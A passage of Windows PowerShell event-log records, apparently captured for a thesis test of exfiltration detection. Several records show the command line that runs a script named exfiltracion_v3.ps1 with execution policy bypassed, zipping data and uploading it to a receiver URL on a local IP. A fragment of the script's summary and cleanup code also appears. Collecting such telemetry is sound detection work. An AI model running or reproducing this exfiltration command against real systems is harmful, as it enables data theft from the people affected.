parameter.\"\n}\n\n$summary = [ordered]@{\n    Timestamp = (Get-Date).ToString(\"o\")\n    WorkDir = $WorkDir\n    OutputDir = $OutputDir\n    ZipFile = $zipFile\n    CopyFile = $copyFile\n    ZipBytes = $zipItem.Length\n    CopyBytes = $copyItem.Length\n    LocalSHA256 = $localHash\n    ReceiverUrl = $ReceiverUrl\n    EnableUpload = [bool]$EnableUpload\n    TimeoutSec = $TimeoutSec\n    HttpStatusCode = $httpStatusCode\n    UploadSucceeded = $uploadSucceeded\n    UploadError = $uploadError\n    ReceiverResponse = $receiverResponse\n    KeepArtifacts = [bool]$KeepArtifacts\n}\n\n$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8\n\nWrite-Host \"Controlled staging/archive completed.\"\nWrite-Host \"ZIP created: $zipFile\"\nWrite-Host \"ZIP copy created: $copyFile\"\nWrite-Host \"ZIP bytes: $($zipItem.Length)\"\nWrite-Host \"ZIP SHA256: $localHash\"\nWrite-Host \"Receiver URL: $ReceiverUrl\"\nWrite-Host \"Upload enabled: $([bool]$EnableUpload)\"\nWrite-Host \"HTTP status: $httpStatusCode\"\nWrite-Host \"Upload succeeded: $uploadSucceeded\"\nWrite-Host \"Summary: $summaryFile\"\n\nif (-not $KeepArtifacts.IsPresent) {\n    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\n    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\n    Write-Host \"Local ZIP artifacts removed because KeepArtifacts=false.\"\n}\n\nif ($EnableUpload.IsPresent -and -not $uploadSucceeded) {\n    exit 2\n}\n\n\nId. de bloque de script: 622fc977-93d2-4ba5-b172-df52bf57b8a9\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
{"Timestamp":"2026-07-12T13:29:21.728433609Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4103,"Level":"informational","Title":"PwSh Pipeline Exec","RecordID":3287686,"Details":"Payload: CommandInvocation(Add-Type): \"Add-Type\"\r\nEnlaceDeParámetros(Add-Type): nombre=\"AssemblyName\"; valor=\"System.IO.Compression\"\r\n","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4103},"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":0,"TimeCreated":{"SystemTime":1783862961.7284336},"EventRecordID":3287686,"Correlation":{"ActivityID":"F2694954-11F0-0003-BE22-6FF2F011DD01"},"Execution":{"ProcessID":4956,"ThreadID":12076},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"ContextInfo":"        Gravedad = Informational\r\n        Nombre de host = ConsoleHost\r\n        Versión de host = 5.1.19041.3031\r\n        Id. de host = 6c2c2a4f-a6b2-4779-b6af-8ba846105a09\r\n        Aplicación host = powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1 -ReceiverUrl http://192.168.1.129:8088/upload -TimeoutSec 60 -EnableUpload -KeepArtifacts\r\n        Versión del motor = 5.1.19041.3031\r\n        Id. de espacio de ejecución = db0723ca-b6f7-4a50-ba96-a9fb2e90d496\r\n        Id. de canalización = 1\r\n        Nombre de comando = Add-Type\r\n        Tipo de comando = Cmdlet\r\n        Nombre de script = C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Archive\\Microsoft.PowerShell.Archive.psm1\r\n        Ruta de acceso de comando = \r\n        Número de secuencia = 16\r\n        Usuario = LT29\\seguridad\r\n        Usuario conectado = \r\n        Id. de shell = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Add-Type): \"Add-Type\"\r\nEnlaceDeParámetros(Add-Type): nombre=\"AssemblyName\"; valor=\"System.IO.Compression\"\r\n"},"Message":"CommandInvocation(Add-Type): \"Add-Type\"\r\nEnlaceDeParámetros(Add-Type): nombre=\"AssemblyName\"; valor=\"System.IO.Compression\"\r\n\n\nContexto:\n        Gravedad = Informational\r\n        Nombre de host = ConsoleHost\r\n        Versión de host = 5.1.19041.3031\r\n        Id. de host = 6c2c2a4f-a6b2-4779-b6af-8ba846105a09\r\n        Aplicación host = powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1 -ReceiverUrl http://192.168.1.129:8088/upload -TimeoutSec 60 -EnableUpload -KeepArtifacts\r\n        Versión del motor = 5.1.19041.3031\r\n        Id. de espacio de ejecución = db0723ca-b6f7-4a50-ba96-a9fb2e90d496\r\n        Id. de canalización = 1\r\n        Nombre de comando = Add-Type\r\n        Tipo de comando = Cmdlet\r\n        Nombre de script = C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Archive\\Microsoft.PowerShell.Archive.psm1\r\n        Ruta de acceso de comando = \r\n        Número de secuencia = 16\r\n        Usuario = LT29\\seguridad\r\n        Usuario conectado = \r\n        Id. de shell = Microsoft.PowerShell\r\n\n\nDatos de usuario:\n\n\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
{"Timestamp":"2026-07-12T13:29:21.731528043Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4103,"Level":"informational","Title":"PwSh Pipeline Exec","RecordID":3287687,"Details":"Payload: CommandInvocation(Add-Type): \"Add-Type\"\r\nEnlaceDeParámetros(Add-Type): nombre=\"AssemblyName\"; valor=\"System.IO.Compression.FileSystem\"\r\n","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4103},"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":0,"TimeCreated":{"SystemTime":1783862961.731528},"EventRecordID":3287687,"Correlation":{"ActivityID":"F2694954-11F0-0003-BF22-6FF2F011DD01"},"Execution":{"ProcessID":4956,"ThreadID":12076},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"ContextInfo":"        Gravedad = Informational\r\n        Nombre de host = ConsoleHost\r\n        Versión de host = 5.1.19041.3031\r\n        Id. de host = 6c2c2a4f-a6b2-4779-b6af-8ba846105a09\r\n        Aplicación host = powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1 -ReceiverUrl http://192.168.1.129:8088/upload -TimeoutSec 60 -EnableUpload -KeepArtifacts\r\n        Versión del motor = 5.1.19041.3031\r\n        Id. de espacio de ejecución = db0723ca-b6f7-4a50-ba96-a9fb2e90d496\r\n        Id. de canalización = 1\r\n        Nombre de comando = Add-Type\r\n        Tipo de comando = Cmdlet\r\n        Nombre de script = C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Archive\\Microsoft.PowerShell.Archive.psm1\r\n        Ruta de acceso de comando = \r\n        Número de secuencia = 18\r\n        Usuario = LT29\\seguridad\r\n        Usuario conectado = \r\n        Id. de shell = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Add-Type): \"Add-Type\"\r\nEnlaceDeParámetros(Add-Type): nombre=\"AssemblyName\"; valor=\"System.IO.Compression.FileSystem\"\r\n"},"Message":"CommandInvocation(Add-Type): \"Add-Type\"\r\nEnlaceDeParámetros(Add-Type): nombre=\"AssemblyName\"; valor=\"System.IO.Compression.FileSystem\"\r\n\n\nContexto:\n        Gravedad = Informational\r\n        Nombre de host = ConsoleHost\r\n        Versión de host = 5.1.19041.3031\r\n        Id. de host = 6c2c2a4f-a6b2-4779-b6af-8ba846105a09\r\n        Aplicación host = powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1 -ReceiverUrl http://192.168.1.129:8088/upload -TimeoutSec 60 -EnableUpload -KeepArtifacts\r\n        Versión del motor = 5.1.19041.3031\r\n        Id. de espacio de ejecución = db0723ca-b6f7-4a50-ba96-a9fb2e90d496\r\n        Id. de canalización = 1\r\n        Nombre de comando = Add-Type\r\n        Tipo de comando = Cmdlet\r\n        Nombre de script = C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Archive\\Microsoft.PowerShell.Archive.psm1\r\n        Ruta de acceso de comando = \r\n        Número de secuencia = 18\r\n        Usuario = LT29\\seguridad\r\n        Usuario conectado = \r\n        Id. de shell = Microsoft.PowerShell\r\n\n\nDatos de usuario:\n\n\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
